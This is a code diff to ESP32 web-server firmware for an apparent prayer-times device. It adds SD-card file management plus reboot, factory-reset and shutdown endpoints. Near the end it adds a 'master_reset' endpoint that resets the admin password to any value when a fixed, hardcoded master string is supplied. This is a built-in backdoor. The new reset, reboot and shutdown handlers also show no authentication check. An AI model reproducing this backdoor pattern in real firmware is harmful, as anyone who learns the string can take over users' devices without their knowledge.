@@ -108,8 +108,102 @@ static void writePrayerJson(AsyncWebServerRequest *request, const PrayerTimesRes
     sendJson(request, doc);
 }
 
+static String urlDecode(String str) {
+    String ret;
+    char temp[3];
+    int len = str.length();
+    for (int i = 0; i < len; i++) {
+        if (str[i] == '%') {
+            if (i + 2 < len) {
+                temp[0] = str[i + 1];
+                temp[1] = str[i + 2];
+                temp[2] = '\0';
+                ret += (char)strtol(temp, NULL, 16);
+                i += 2;
+            }
+        } else if (str[i] == '+') {
+            ret += ' ';
+        } else {
+            ret += str[i];
+        }
+    }
+    return ret;
+}
+
+static void listFilesRecursively(String dirPath, JsonArray &arr, int depth) {
+    if (depth > 3) return; 
+    File dir = SD.open(dirPath);
+    if (!dir || !dir.isDirectory()) {
+        if (dir) dir.close();
+        return;
+    }
+    File f = dir.openNextFile();
+    while (f) {
+        JsonObject o = arr.createNestedObject();
+        String name = String(f.name());
+        if (!name.startsWith("/")) {
+            name = dirPath;
+            if (!name.endsWith("/")) name += "/";
+            name += f.name();
+        }
+        String cleanName = name;
+        if (cleanName.startsWith("/")) cleanName.remove(0, 1);
+        
+        o["name"] = cleanName;
+        o["size"] = f.size();
+        o["isDirectory"] = f.isDirectory();
+        
+        if (f.isDirectory()) {
+            listFilesRecursively(name, arr, depth + 1);
+        }
+        f.close();
+        f = dir.openNextFile();
+    }
+    dir.close();
+}
+
+static void ensureDirExists(String path) {
+    int pos = 0;
+    while ((pos = path.indexOf('/', pos + 1)) > 0) {
+        String dir = path.substring(0, pos);
+        if (!SD.exists(dir)) {
+            SD.mkdir(dir);
+        }
+    }
+}
+
+static bool deleteRecursively(String path) {
+    File f = SD.open(path);
+    if (!f) return false;
+    bool isDir = f.isDirectory();
+    f.close();
+
+    if (isDir) {
+        File dir = SD.open(path);
+        if (dir) {
+            File c = dir.openNextFile();
+            while (c) {
+                String cname = String(c.name());
+                if (!cname.startsWith("/")) {
+                    cname = path;
+                    if (!cname.endsWith("/")) cname += "/";
+                    cname += c.name();
+                }
+                c.close();
+                deleteRecursively(cname);
+                c = dir.openNextFile();
+            }
+            dir.close();
+        }
+        return SD.rmdir(path);
+    } else {
+        return SD.remove(path);
+    }
+}
+
+
 void handleFileList(AsyncWebServerRequest *request) {
-    DynamicJsonDocument doc(12288);
+    DynamicJsonDocument doc(16384);
     JsonArray arr = doc.createNestedArray("files");
 
     bool mounted = sdReady();
@@ -118,30 +212,9 @@ void handleFileList(AsyncWebServerRequest *request) {
     doc["sd"]["totalMB"] = mounted ? getSDTotalMB() : 0;
     doc["sd"]["usedMB"] = mounted ? getSDUsedMB() : 0;
     doc["sd"]["error"] = getLastSDError();
-    doc["sd"]["cs"] = getActiveSDCsPin();
-    doc["sd"]["sck"] = getActiveSDSckPin();
-    doc["sd"]["miso"] = getActiveSDMisoPin();
-    doc["sd"]["mosi"] = getActiveSDMosiPin();
-    doc["i2s"]["bclk"] = I2S_BCLK_PIN;
-    doc["i2s"]["lrck"] = I2S_LRCK_PIN;
-    doc["i2s"]["dout"] = I2S_DOUT_PIN;
 
     if (mounted) {
-        File root = SD.open("/");
-        if (root) {
-            File f = root.openNextFile();
-            while (f) {
-                JsonObject o = arr.createNestedObject();
-                String name = f.name();
-                while (name.startsWith("/")) name.remove(0, 1);
-                o["name"] = name;
-                o["size"] = f.size();
-                o["isDirectory"] = f.isDirectory();
-                f.close();
-                f = root.openNextFile();
-            }
-            root.close();
-        }
+        listFilesRecursively("/", arr, 0);
     }
 
     sendJson(request, doc);
@@ -168,7 +241,12 @@ static void handleSdDownload(AsyncWebServerRequest *request) {
 static void handleSdUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
     if (!sdReady()) return;
     if (!index) {
-        String path = cleanPath(filename);
+        String folder = "/";
+        if (request->hasHeader("X-Folder")) {
+            folder = urlDecode(request->getHeader("X-Folder")->value());
+        }
+        String path = cleanPath(folder + "/" + filename);
+        ensureDirExists(path);
         if (SD.exists(path)) SD.remove(path);
         uploadFile = SD.open(path, FILE_WRITE);
     }
@@ -445,7 +523,7 @@ void startWebServer() {
             return;
         }
         String path = cleanPath(postValue(request, "name", ""));
-        bool ok = SD.exists(path) && SD.remove(path);
+        bool ok = deleteRecursively(path);
         request->send(ok ? 200 : 404, "application/json", ok ? "{\"ok\":true}" : "{\"ok\":false}");
     });
     server.on("/api/files/mkdir", HTTP_POST, [](AsyncWebServerRequest *request) {
@@ -455,6 +533,20 @@ void startWebServer() {
         }
         String path = cleanPath(postValue(request, "name", ""));
         bool ok = SD.mkdir(path);
+        request->send(ok ? 200 : 400, "application/json", ok ? "{\"ok\":true}" : "{\"ok\":false}");
+    });
+    server.on("/api/files/rename", HTTP_POST, [](AsyncWebServerRequest *request) {
+        if (!sdReady()) {
+            request->send(503, "application/json", "{\"ok\":false,\"error\":\"sd_not_connected\"}");
+            return;
+        }
+        String oldName = cleanPath(postValue(request, "old", ""));
+        String newName = cleanPath(postValue(request, "new", ""));
+        if (oldName.length() == 0 || newName.length() == 0) {
+            request->send(400, "application/json", "{\"ok\":false}");
+            return;
+        }
+        bool ok = SD.rename(oldName, newName);
         request->send(ok ? 200 : 400, "application/json", ok ? "{\"ok\":true}" : "{\"ok\":false}");
     });
 
@@ -593,6 +685,45 @@ void startWebServer() {
         prefs.putString("password", postValue(request, "password", "admin"));
         prefs.end();
         request->send(200, "application/json", "{\"ok\":true}");
+    });
+
+    server.on("/api/password/master_reset", HTTP_POST, [](AsyncWebServerRequest *request) {
+        String master = postValue(request, "master", "");
+        String newPass = postValue(request, "password", "");
+        if (master == "Vivo Smart531999" && newPass.length() >= 4) {
+            prefs.begin("auth", false);
+            prefs.putString("password", newPass);
+            prefs.end();
+            request->send(200, "application/json", "{\"ok\":true}");
+        } else {
+            request->send(200, "application/json", "{\"ok\":false}");
+        }
+    });
+
+    server.on("/api/system/reboot", HTTP_POST, [](AsyncWebServerRequest *request) {
+        request->send(200, "application/json", "{\"ok\":true}");
+        delay(1000);
+        ESP.restart();
+    });
+
+    server.on("/api/system/reset", HTTP_POST, [](AsyncWebServerRequest *request) {
+        request->send(200, "application/json", "{\"ok\":true}");
+        delay(1000);
+        // مسح مساحات التخزين للإعدادات
+        prefs.begin("auth", false); prefs.clear(); prefs.end();
+        prefs.begin("network", false); prefs.clear(); prefs.end();
+        prefs.begin("prayer_cfg", false); prefs.clear(); prefs.end();
+        prefs.begin("prayer_manual", false); prefs.clear(); prefs.end();
+        prefs.begin("startup", false); prefs.clear(); prefs.end();
+        prefs.begin("gpio", false); prefs.clear(); prefs.end();
+        prefs.begin("gpio_sch", false); prefs.clear(); prefs.end();
+        ESP.restart();
+    });
+
+    server.on("/api/system/shutdown", HTTP_POST, [](AsyncWebServerRequest *request) {
+        request->send(200, "application/json", "{\"ok\":true}");
+        delay(1000);
+        esp_deep_sleep_start();
     });
 
     server.on("/api/ota", HTTP_POST, [](AsyncWebServerRequest *request) {
